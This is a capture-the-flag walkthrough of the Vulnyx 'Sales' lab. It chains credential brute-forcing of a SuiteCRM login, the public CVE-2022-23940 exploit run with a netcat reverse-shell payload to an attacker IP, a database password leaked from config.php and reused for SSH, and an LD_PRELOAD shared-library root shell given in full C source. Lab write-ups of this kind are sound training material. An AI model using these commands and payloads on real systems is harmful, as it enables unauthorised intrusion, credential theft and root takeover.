# Vulnyx: Sales

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Fenixia` |
| **Tools used** | `nmap` · `ffuf` · `username-anarchy` · `cewl` · `wfuzz` · `nc` · `hydra` · `gcc` |
| **Tags** | `#VHostFuzzing` `#CredentialStuffing` `#RCE` `#CredentialLeak` `#LD_PRELOAD` |
| **URL** | https://vulnyx.com/machines/ |

A team page leaks a set of full names, turned into likely usernames with `username-anarchy` and paired against a site-scraped wordlist to brute-force a login on a SuiteCRM subdomain. That version is vulnerable to CVE-2022-23940, giving RCE and a shell. From there, SuiteCRM's own config file leaks database credentials reused for SSH, and a `sudo` rule around `ping` that preserves `LD_PRELOAD` is enough to load a malicious shared library as root.

## Enumeration
### Port Enumeration
A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn sales.nyx

PORT   STATE  SERVICE  REASON
22/tcp open   ssh      syn-ack ttl 64
80/tcp open   http     syn-ack ttl 64
MAC Address: 08:00:27:F3:01:CB (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV sales.nyx

PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 dd:2c:11:05:8e:0a:ea:0b:df:52:60:ed:bf:b4:c2:92 (ECDSA)
|_  256 9d:5a:c5:8d:db:27:66:ca:35:30:05:1f:ad:25:40:3f (ED25519)
80/tcp open   http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: AksisDesign
MAC Address: 08:00:27:F3:01:CB (Oracle VirtualBox virtual NIC)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

The main page:

```
http://sales.nyx/
```

<img src="../Images/sales/Pasted image 20260803153530.png"/>
<img src="../Images/sales/Pasted image 20260803153545.png"/>

A team section lists full names — candidate usernames for later:

> **Users:** `Yuna Yoon`, `Elena Eve`, `Emma Baek`, `Rachel Choi`

```bash
$ ffuf -u http://sales.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2ms]
index.html              [Status: 200, Size: 19489, Words: 4727, Lines: 388, Duration: 5ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 2ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1106ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1109ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 1ms]
fonts                   [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 4ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 5ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 10ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 10ms]
:: Progress: [882188/882188] :: Job [1/1] :: 1550 req/sec :: Duration: [0:13:25] :: Errors: 2030 ::
```

### Subdomain Discovery

The path fuzzing turns up nothing beyond static assets, so the next move is to fuzz the `Host` header instead — a virtual host scan looks for sites served on the same IP but a different name:

```bash
$ ffuf -u http://sales.nyx -H 'Host: FUZZ.sales.nyx' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 20

www                     [Status: 200, Size: 19489, Words: 4727, Lines: 388, Duration: 9ms]
crm                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 502ms]
:: Progress: [19966/19966] :: Job [1/1] :: 3 [1941 req/sec] :: Duration: [0:00:12] :: Errors: 0 ::
```

The `crm` vhost is the lead (add `crm.sales.nyx` to `/etc/hosts` to reach it):

```
http://crm.sales.nyx/
```

<img src="../Images/sales/Pasted image 20260803153647.png"/>

It's a SuiteCRM instance, so a content discovery scan runs against it too:

```bash
$ ffuf -u http://crm.sales.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 7ms]
download.php            [Status: 200, Size: 23, Words: 5, Lines: 1, Duration: 26ms]
themes                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 29ms]
pdf.php                 [Status: 200, Size: 23, Words: 5, Lines: 1, Duration: 19ms]
modules                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 20ms]
uploads.html            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 17ms]
uploads                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 21ms]
uploads.txt             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 21ms]
uploads.php             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 22ms]
data                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 19ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 934ms]
upload.html             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 18ms]
upload.txt              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 18ms]
upload.php              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
upload                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 21ms]
service                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 27ms]
tests.php               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 22ms]
tests                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 23ms]
tests.html              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 23ms]
tests.txt               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 23ms]
install                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 20ms]
lib                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 20ms]
```

## Initial Access

### Building Targeted Wordlists

Instead of generic lists, two tools build wordlists specific to this target. `username-anarchy` converts the full names from the team page into the common username formats real systems tend to use (`yuna.yoon`, `yyoon`, and so on):

```bash
$ git clone https://github.com/urbanadventurer/username-anarchy.git
$ ./username-anarchy --input-file ~/Vulnyx/Easy/Sales/users.txt > ~/Vulnyx/Easy/Sales/users.dic
```

`cewl` scrapes the main site's own content to build a password list out of words that actually appear on it — often more effective than a generic wordlist, since site-specific terms (product names, taglines, internal jargon) are exactly the kind of thing people reuse in passwords:

```bash
$ cewl http://sales.nyx/ -w passwords.dic
```

### Credential Stuffing via wfuzz

`wfuzz` combines both wordlists against the CRM's login form directly, filtering out the known failure response by its word count (`--hh=11570`):

```bash
$ wfuzz -c -w users.dic -w passwords.dic -d 'module=Users&action=Authenticate&return_module=Users&return_action=Login&cant_login=&login_module=&login_action=&login_record=&login_token=&login_oauth_token=&login_mobile=&user_name=FUZZ&username_password=FUZ2Z&Login=Log+In' -u 'http://crm.sales.nyx/index.php' -L --hh=11570

=====================================================================
ID           Response   Lines    Word     Chars       Payload
=====================================================================

000000434:   200        245 L    703 W    11581 Ch    "yuna.yoon - AksisDesign"
```

> **Credentials:** `yuna.yoon:AksisDesign`

### RCE via CVE-2022-23940

SuiteCRM's own About page reports the exact version, which turns straight into an exploit search:

```
http://crm.sales.nyx/index.php?module=Home&action=About
```

<img src="../Images/sales/Pasted image 20260803154023.png"/>

> **Version:** `7.12.4`. **Exploit:** `https://github.com/manuelz120/CVE-2022-23940`

```bash
$ git clone https://github.com/manuelz120/CVE-2022-23940.git
```

```bash
$ python3 exploit.py -h http://crm.sales.nyx -u yuna.yoon -p AksisDesign --payload "busybox nc <ATTACKER_IP> <PORT> -e /bin/sh"
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```

### Shell as www-data

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [sales.nyx] 50378
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A quick pty upgrade makes the shell usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

## Lateral Movement

### Loot: Database Credentials in SuiteCRM's Config

`/etc/passwd` shows who's worth pivoting to — only `eve` (uid 1001) and `root` have real login shells, so `eve` is the target:

```bash
www-data@template:/var/www/suitecrm$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
eve:x:1001:1001::/home/eve:/bin/bash
ntpsec:x:103:111::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
mysql:x:104:113:MySQL Server,,,:/nonexistent:/bin/false
```

SuiteCRM keeps its settings — database password included — in `config.php`, so that file is the obvious place to look for a credential:

```bash
www-data@template:/var/www/suitecrm$ ls -l /var/www/suitecrm
www-data@template:/var/www/suitecrm$ grep -r password /var/www/suitecrm/config.php
  'db_password' => 'Ev3*CRm_DBaS3',
  'default_password' => '',
    3 => 'system_generated_password',
    11 => 'password',
    3 => 'system_generated_password',
    11 => 'password',
  'passwordsetting' =>
  'generatepasswordtmpl' => 'd6f7aa46-4ec6-4c3a-6e95-683893bd0bb1',
  'lostpasswordtmpl' => 'd878552c-8b13-491f-53c0-6838932a3f86',
  'forgotpasswordON' => false,
```

> **Credentials:** `eve:Ev3*CRm_DBaS3`

The username matches "Elena Eve" from the team page — the same password reused for her actual system account.

### Shell as eve

```bash
$ hydra -l 'eve' -p 'Ev3*CRm_DBaS3' ssh://sales.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://sales.nyx:22/
[22][ssh] host: sales.nyx   login: eve   password: Ev3*CRm_DBaS3
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh eve@sales.nyx
eve@sales.nyx's password:
eve@template:~$ id
uid=1001(eve) gid=1001(eve) groups=1001(eve)
eve@template:~$ ls -l /home/eve
total 4
-r-------- 1 eve eve 33 Jun  2  2025 user.txt
eve@template:~$ cat /home/eve/user.txt
2f8e800653aaea48f38870b3f32ce43f
```

> **User flag:** `2f8e800653aaea48f38870b3f32ce43f`

## Privilege Escalation

### `LD_PRELOAD` via `sudo ping`

`sudo -l` shows the one command `eve` can run as root — and, crucially, that the environment reset keeps `LD_PRELOAD` intact:

```bash
eve@template:~$ sudo -l
Matching Defaults entries for eve on template:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User eve may run the following commands on template:
    (root) NOPASSWD: /usr/bin/ping
```

When `sudo` preserves `LD_PRELOAD` for an allowed command, any shared library named in that variable gets loaded — and its initialization code runs — before the target binary's own code, with the privileges the process already has (root, here). A small shared library does the rest: its `_init` function (the traditional, linker-recognized entry point for a shared object's init code, predating the more common `__attribute__((constructor))` style) drops the `LD_PRELOAD` variable, sets both UID and GID to 0, and spawns a shell:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
$ cat shell.c
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

The compiled library moves over via a quick HTTP server, then loads against the allowed `sudo` command:

```bash
eve@template:/tmp$ wget http://<ATTACKER_IP>:8000/shell.so
--2026-08-03 08:20:09--  http://<ATTACKER_IP>:8000/shell.so
Connecting to <ATTACKER_IP>:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14152 (14K) [application/octet-stream]
Saving to: 'shell.so'

shell.so.1                  100%[===============================================>]  13.82K  --.-KB/s    in 0s

2026-08-03 08:20:09 (137 MB/s) - 'shell.so' saved [14152/14152]

eve@template:/tmp$ sudo -u root LD_PRELOAD=/tmp/shell.so /bin/ping
root@template:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@template:/tmp# ls -l /root
total 4
-r-------- 1 root root 33 Jun  2  2025 root.txt
root@template:/tmp# cat /root/root.txt
78b90461dcfa3fb656988763e8782739
```

> **Root flag:** `78b90461dcfa3fb656988763e8782739`

## Takeaways

- Generic wordlists aren't always the most efficient option — tools that build target-specific usernames (`username-anarchy`) and passwords (`cewl`, scraping the site's own content) can outperform `rockyou.txt` against a system that reuses names and jargon it's already exposing publicly.
- Checking a CMS or CRM's version through its own admin/about page is often faster than fingerprinting blind — a known version number turns straight into a search for a matching public exploit.
- A `sudo` rule that preserves `LD_PRELOAD` for an allowed command undermines the entire restriction: it doesn't matter how limited the command itself is if arbitrary code runs before that command's own logic even starts.